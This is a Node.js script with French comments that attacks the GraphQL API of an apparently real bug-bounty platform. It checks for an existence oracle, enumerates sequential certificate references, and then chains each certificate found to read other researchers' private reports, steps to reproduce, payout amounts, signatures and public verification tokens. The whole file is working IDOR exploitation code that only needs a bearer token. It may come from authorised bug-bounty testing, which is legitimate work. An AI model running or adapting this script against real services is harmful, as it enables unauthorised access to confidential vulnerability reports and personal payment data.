import fs from "fs";
const EP = "https://bugsecure-api.senintel.sn/graphql";
const T = process.env.BB_TOKEN;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const call = async (q, v) => {
  const r = await fetch(EP, { method: "POST", headers: { "Content-Type": "application/json", Authorization: "Bearer " + T }, body: JSON.stringify({ query: q, variables: v || {} }) });
  const t = await r.text(); let j = null; try { j = JSON.parse(t); } catch {}
  return { s: r.status, t, j };
};
const MIN = `id reference reportId adjudicationId organizationId researcherId researcherUsername reportTitle grossAmount netAmount currency status issuedAt isOverdue expectedAmount`;
const qMin = `query($r:String!){ certificate(reference:$r){ ${MIN} } }`;

console.log("=== 0) ORACLE : reponse pour une reference qui n existe pas ===");
for (const ref of ["BSC-2026-9999", "NOPE", "BSC-2026-0001", "bsc-2026-0001"]) {
  const r = await call(qMin, { r: ref });
  const err = r.j?.errors?.map((x) => x.message).join(" | ");
  const c = r.j?.data?.certificate;
  console.log("  " + ref.padEnd(16) + "-> " + (c ? "CERTIFICAT TROUVE : " + JSON.stringify(c).slice(0, 150) : "HTTP " + r.s + " " + (err || "null").slice(0, 120)));
  await sleep(1000);
}

console.log("\n=== 1) balayage des references sequentielles ===");
const prefixes = ["BSC-2026-", "BSC-2025-"];
let found = [];
for (const pfx of prefixes) {
  for (let i = 1; i <= 60; i++) {
    const ref = pfx + String(i).padStart(4, "0");
    const r = await call(qMin, { r: ref });
    const c = r.j?.data?.certificate;
    if (c) {
      console.log("  " + ref + " -> " + JSON.stringify({ researcher: c.researcherUsername, report: c.reportTitle, amount: c.grossAmount + " " + c.currency, reportId: c.reportId, adjId: c.adjudicationId, orgId: c.organizationId, researcherId: c.researcherId, status: c.status, overdue: c.isOverdue }));
      found.push(c);
    } else if (r.j?.errors && i <= 3) {
      console.log("  " + ref + " -> " + r.j.errors.map((x) => x.message).join("|").slice(0, 130));
    }
    await sleep(700);
  }
}
console.log("\n  certificats trouves : " + found.length);

if (found.length) {
  const f = found[0];
  console.log("\n=== 2) notre compte possede-t-il des certificats ? (comparaison) ===");
  const mine = await call(`{ myCertificates { id reference reportId } }`, {});
  console.log("  nos certificats : " + JSON.stringify(mine.j?.data?.myCertificates));
  console.log("  certificat lu  : " + f.reference + " / researcher=" + f.researcherUsername + " / report=" + f.reportTitle);
  console.log("  => IDOR si le researcher n est pas william_root et que nous ne possedons aucun certificat");

  console.log("\n=== 3) CHAINE : le reportId du certificat -> le rapport d autrui ===");
  if (f.reportId) {
    const rep = await call(`query($id:ID!){ report(id:$id){ id title description stepsToReproduce impact claimedSeverity status reporter { id username } program { slug } } }`, { id: f.reportId });
    console.log("  report(id=" + f.reportId + ") -> HTTP " + rep.s + "  " + (rep.j?.errors ? "ERR: " + rep.j.errors.map((x) => x.message).join("|") : JSON.stringify(rep.j?.data)).slice(0, 700));
  }
  console.log("\n=== 4) CHAINE : le document signe du certificat (publicToken) ===");
  const doc = await call(`query($r:String!){ certificateDocument(reference:$r){ reference isSigned publicToken signature keyId signedAt retainedUntil signatureCovers document } }`, { r: f.reference });
  console.log("  certificateDocument -> HTTP " + doc.s + "  " + (doc.j?.errors ? "ERR: " + doc.j.errors.map((x) => x.message).join("|") : JSON.stringify(doc.j?.data)).slice(0, 700));
  const vt = doc.j?.data?.certificateDocument?.publicToken;
  if (vt) {
    await sleep(900);
    const ver = await call(`query($t:String!){ verifyCertificate(publicToken:$t){ reference isSigned status signedAt document } }`, { t: vt });
    console.log("  verifyCertificate(publicToken) -> HTTP " + ver.s + "  " + (ver.j?.errors ? "ERR: " + ver.j.errors.map((x) => x.message).join("|") : JSON.stringify(ver.j?.data)).slice(0, 700));
  }
  console.log("\n=== 5) la page publique /verify/<reference> montre-t-elle les memes donnees ? ===");
  const html = await (await fetch("https://bugsecure.senintel.sn/verify/" + f.reference)).text();
  const has = /\d{4,}/.test(html);
  console.log("  page /verify/" + f.reference + " : " + html.length + " octets | contient le montant: " + (html.includes(String(f.grossAmount)) ? "OUI" : "non (charge cote client)"));
}
